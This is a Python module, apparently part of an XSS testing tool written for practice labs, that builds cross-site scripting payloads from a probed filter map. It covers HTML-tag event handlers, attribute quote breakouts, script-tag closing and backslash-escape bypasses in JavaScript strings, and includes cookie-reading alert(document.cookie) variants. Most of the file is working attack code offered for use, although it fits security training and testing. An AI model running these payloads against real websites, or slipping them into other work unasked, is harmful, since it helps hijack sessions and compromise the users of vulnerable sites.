"""
payload_generator.py — Generate XSS payloads từ FilterMap.

Dùng allowed_combos từ filter_prober để sinh payloads phù hợp với
từng context (html / attribute / script).
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Optional

from filter_prober.filter_prober import Behavior, FilterMap

_EXEC = ["alert(1)", "confirm(1)", "print()", "alert(document.cookie)", "alert`1`"]

def _e(i: int = 0) -> str:
    return _EXEC[min(i, len(_EXEC) - 1)]


@dataclass
class Payload:
    value:    str
    strategy: str
    context:  str
    note:     str = ""


@dataclass
class AttributeMeta:
    attr_name:  str  = ""
    is_quoted:  bool = True
    quote_char: str  = '"'


# ---------------------------------------------------------------------------
# HTML context
# ---------------------------------------------------------------------------

def _html_payloads(fm: FilterMap, **_) -> list[Payload]:
    if not fm.tags_usable:
        return []

    out: list[Payload] = []

    if fm.script_usable:
        out += [
            Payload(f"<script>{_e(0)}</script>", "script_tag",     "html"),
            Payload(f"<script>{_e(1)}</script>", "script_confirm", "html"),
        ]

    for tag, event in fm.allowed_combos:
        extra = ""
        if event == "onfocus":
            extra = " tabindex=1"
        elif event == "onerror":
            extra = " src=x"

        # Payload cơ bản
        out.append(Payload(
            value    = f"<{tag} {event}={_e(0)}{extra}>",
            strategy = f"{tag}_{event}",
            context  = "html",
        ))

        # Variant đặc biệt cho từng lab
        if tag == "body" and event == "onresize":
            out.append(Payload(
                value    = "<body onresize=print()>",
                strategy = "body_onresize_print",
                context  = "html",
                note     = "Test 1: print() triggers resize event in iframe",
            ))

        if tag in ("xss", "x") and event == "onfocus":
            out.append(Payload(
                value    = f"<{tag} id=x onfocus=alert(document.cookie) tabindex=1>",
                strategy = f"{tag}_onfocus_cookie",
                context  = "html",
                note     = "Test 2: steal cookie via fragment #x",
            ))

    return out


# ---------------------------------------------------------------------------
# Attribute context — Test 3
# ---------------------------------------------------------------------------

def _attribute_payloads(fm: FilterMap, meta: AttributeMeta, **_) -> list[Payload]:
    out   = []
    qchar = meta.quote_char

    dq_free = fm.double_quote == Behavior.ALLOWED
    sq_free = fm.single_quote == Behavior.ALLOWED

    breakout: Optional[str] = None
    if qchar == '"' and dq_free:    breakout = '"'
    elif qchar == "'" and sq_free:  breakout = "'"
    elif dq_free:                   breakout = '"'
    elif sq_free:                   breakout = "'"

    if breakout and fm.event_handlers == Behavior.ALLOWED:
        bq = breakout
        out += [
            Payload(f'{bq}onmouseover={bq}alert(1)',
                    "quoted_mouseover", "attribute",
                    "Test 3: breakout + onmouseover"),
            Payload(f'{bq} onmouseover="alert(1)',
                    "quoted_mouseover_space", "attribute"),
            Payload(f'{bq} onfocus={_e(0)} autofocus {bq}',
                    "quoted_autofocus", "attribute"),
        ]

    if not meta.is_quoted or breakout is None:
        if fm.event_handlers == Behavior.ALLOWED:
            out += [
                Payload(f"onmouseover={_e(0)}",      "unquoted_mouseover",  "attribute"),
                Payload(f" onmouseover={_e(0)} x=",  "unquoted_mouseover2", "attribute"),
            ]

    return out


# ---------------------------------------------------------------------------
# Script context — Test 4 & 5
# ---------------------------------------------------------------------------

def _js_payloads(fm: FilterMap, js_quote_char: str = "", **_) -> list[Payload]:
    sq_free    = fm.single_quote == Behavior.ALLOWED
    dq_free    = fm.double_quote == Behavior.ALLOWED
    sq_escaped = fm.single_quote == Behavior.ESCAPED
    bs_doubled = fm.backslash    == Behavior.DOUBLED

    out: list[Payload] = []

    # Test 4: breakout khỏi script tag bằng angle brackets
    if fm.tags_usable:
        if fm.script_usable:
            out += [
                Payload(f"</script><script>{_e(0)}</script>",
                        "script_tag_breakout", "script",
                        "Test 4: close current script tag, open new one"),
                Payload(f"</script><script>{_e(1)}</script>",
                        "script_tag_breakout_confirm", "script"),
            ]

    # Test 5: backslash doubled → single quote escaped
    if sq_escaped or bs_doubled:
        out += [
            Payload(r"\'-alert(1)//",               "bs_sq_alert",   "script",
                    r"Test 5: \'-alert(1)//"),
            Payload(r"\'-confirm(1)//",             "bs_sq_confirm", "script"),
            Payload(r"\'-alert(document.cookie)//", "bs_sq_cookie",  "script"),
        ]

    # Quote breakout thông thường
    if sq_free:
        out += [
            Payload(f"'-{_e(0)}-'",  "sq_arithmetic", "script"),
            Payload(f"';{_e(0)}//",  "sq_terminate",  "script"),
        ]

    if dq_free and not sq_free:
        out += [
            Payload(f'"-{_e(0)}-"', "dq_arithmetic", "script"),
            Payload(f'";{_e(0)}//', "dq_terminate",  "script"),
        ]

    # Sắp xếp theo js_quote_char
    if js_quote_char == "'":
        sq_pays = [p for p in out if "sq" in p.strategy or "bs_" in p.strategy]
        rest    = [p for p in out if p not in sq_pays]
        return sq_pays + rest
    elif js_quote_char == '"':
        dq_pays = [p for p in out if "dq" in p.strategy]
        rest    = [p for p in out if p not in dq_pays]
        return dq_pays + rest

    return out


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

_GENERATORS = {
    "html":      _html_payloads,
    "attribute": _attribute_payloads,
    "script":    _js_payloads,
    "js":        _js_payloads,
}


def generate_payloads(
    context:       str,
    filter_map:    FilterMap,
    attr_meta:     Optional[AttributeMeta] = None,
    js_quote_char: str = "",
) -> list[Payload]:
    fn = _GENERATORS.get(context)
    if fn is None:
        return []
    if context == "attribute" and attr_meta is None:
        attr_meta = AttributeMeta()
    raw = fn(fm=filter_map, meta=attr_meta, js_quote_char=js_quote_char)
    seen, unique = set(), []
    for p in raw:
        if p.value not in seen:
            seen.add(p.value)
            unique.append(p)
    return unique